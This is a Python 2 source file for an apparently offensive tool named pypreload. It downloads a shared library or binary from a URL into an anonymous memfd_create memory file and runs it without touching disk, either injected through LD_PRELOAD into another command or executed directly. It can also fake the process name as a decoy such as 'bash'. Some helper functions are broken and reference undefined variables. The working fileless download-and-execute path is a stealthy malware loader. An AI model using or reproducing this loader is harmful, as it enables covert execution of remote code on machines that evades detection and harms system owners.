#!/usr/bin/env python

from __future__ import print_function # Only Python 2.x
import sys
import ctypes
import fcntl
import getopt
import os
import random
import string
import subprocess 
import urllib2

from time import sleep


def my_pre_exec():
    os.setegid(1000)
    os.seteuid(1000)


def copyfile(src, dst):
    try:
        O_BINARY = os.O_BINARY
    except:
        O_BINARY = 0

    READ_FLAGS = os.O_RDONLY | O_BINARY
    WRITE_FLAGS = os.O_WRONLY | os.O_CREAT | os.O_TRUNC | O_BINARY
    BUFFER_SIZE = 128*1024


    try:
        fin = os.open(src, READ_FLAGS)
        stat = os.fstat(fin)
        fout = os.open(dst, WRITE_FLAGS, stat.st_mode)
        for x in iter(lambda: os.read(fin, BUFFER_SIZE), ""):
            os.write(fout, x)
            print("wrote: ", len(x))

    finally:
        try: os.close(fin)
        except: pass
        try: os.close(fout)
        except: pass

def fileToPipe(soPath, fPath):
    try:
       os.mkfifo(fPath)
    except OSError as e:
       pass

    sofile = open(soPath, 'rb')
    fd = sofile.fileno()
    flag = fcntl.fcntl(fd, fcntl.F_GETFD)
    fcntl.fcntl(fd, fcntl.F_SETFL, flag | os.O_NONBLOCK)

    fileContent = sofile.read()

    pipe = open(fPath, 'wb' )
    pipe.write(fileContent)
    pipe.flush()

    try: close(sofile)
    except: pass

    return fPath


def fileToShm(modPath):


    return modShmPath

############################## MemFd ###########################

def getRandSeed(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def getMemFd(seed):

    #/usr/include/asm/unistd_32.h:#define __NR_memfd_create 356
    #/usr/include/asm/unistd_64.h:#define __NR_memfd_create 319
    if ctypes.sizeof(ctypes.c_voidp) == 4:
       NR_memfd_create = 356
    else:
       NR_memfd_create = 319

    modMemFd = ctypes.CDLL(None).syscall(NR_memfd_create,seed,1)
    if modMemFd == -1:
        print("Error in Memfd")
        return 0

    modMemPath = "/proc/" + str(os.getpid()) + "/fd/" + str(modMemFd)
    print("PID: ", os.getpid(), "Mem path: ", modMemPath)

    return modMemFd, modMemPath


def urlToMemd(mfd, furl):

    response = urllib2.urlopen(furl)
    data = response.read()

    os.write(mfd,data)
    return True


def urlToShm(furl):

    print("fd: ", mfd);
    response = urllib2.urlopen(furl)
    data = response.read()

    modShmPath = "/dev/shm/" + os.path.basename(soPath) 
    print("About to copy %s to %s" % (soPath, soShmPath))
    copyfile(modPath, modMemPath)

    os.write(mfd,data)
    return True


def executeP(soPath):

    #sleep(100000000)
    ctypes.CDLL(soPath)
    #TODO: ctypes.CDLL('main.so',mode=ctypes.RTLD_GLOBAL)
    #TODO: ctypes.CDLL('dependent.so', mode=1) # RTLD_LAZY


def executePLD(preload, modPath, lcmd):
    print("Module Path: ", modPath)


    if not preload:
        lcmd=[modPath]
    else:
        os.environ["LD_PRELOAD"] = modPath

    print("Launching ", lcmd)
    process = subprocess.Popen(lcmd, 
			stdout=subprocess.PIPE, 
			stderr=subprocess.PIPE, 
                        cwd="/tmp",
			env=os.environ)
    print("PID: %s" % process.pid)

    for stdout_line in iter(process.stdout.readline, ""):
        yield stdout_line 
        process.stdout.flush()
    
    process.stdout.close()
    return_code = process.wait()
    return_code


def usage(err_str=""):
    print(

    """
    error: %s

    Usage: %s ht:l:d:c: <command> <command args ...> 
                -h: help
                -t: payload type: <so|bin>
                -l: location: <file://path | http(s)://url>
                -d: (O) decoy process name
                -c: (O) command to preload

    Example:

    Load shared library, into /bin/ls  
        $./pypreload.py  -t so -l http://127.0.0.1:8080/libmctor.so -c /bin/ls  -- -l /tmp/a
    Note: need `--` before OS command arguments if the arguments contain pypreload flags (e.g. -l)

    Load ZAF binary, decoy as `bash`
        $./pypreload.py -t bin -l http://127.0.0.1:8080/zaf -d  bash



    """ % (err_str,sys.argv[0])
    )
    sys.exit()

def setDname(dname, dpath):

    # Change process name (non-portable, incomplete...)
    sys.path.append(dpath)

    try:
       import setproctitle
       print("Setproctitile setting to ", dname)
       setproctitle.setproctitle(dname)
    except ImportError as e:
       print("Setproctitile not loaded", e)


def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:l:d:c:", 
                ["help", "ptype=", "plocation=", "dname=", "comm="])
    except getopt.GetoptError as err:
        usage(str(err))
    
    ptype     = None
    plocation = None
    dname     = None
    dpath     = "." # where setproctitile.so module is located
    ocmd      = None

    for o, a in opts:
        if   o in ("-h", "--help"):
             usage()
        elif o in ("-l", "--plocation"):
             plocation = a
        elif o in ("-t", "--ptype"):
            if a != "so" and a != "bin":
                usage("Invalid payload type.")

            ptype = a
        elif o in ("-d", "--dname"):
            setDname(a, dpath)
            print("Decoy Process name: ", a)
        elif o in ("-c", "--comm"):
            ocmd = a
            print("Command: ", ocmd)
        else:
            usage("Unhandled option");
    
    #if len(sys.argv) < 3:
    #    usage("Invalid number of args")

    if ocmd == None:
        if ptype == None:
            usage("Need Type of payload")
        elif ptype == 'so':
            usage("Need Command to preload")

    if plocation == None:
        usage("Need Location of payload")


    print("Args left:", args)
    print("Command ", ocmd)

    ocmd_popen = [ocmd] + args
    print("Command []", ocmd_popen)


    # get memfd_create descriptor
    mfd, modMemPath = getMemFd(getRandSeed(8)); 
    if mfd == 0:
        print("Memory for Module NOT allocated")
        sys.exit(2)

    # fetch module from URL and write to memory
    if urlToMemd(mfd, plocation):
        print("Module loaded")

        if ptype == 'so':        

            for line in executePLD(True, modMemPath, ocmd_popen):
                print(line, end="")
        else:
            for line in executePLD(False, modMemPath, None):
                print(line, end="")

    else:
        print("Module NOT loaded")
        sys.exit(1)



if __name__ == '__main__':
    main()
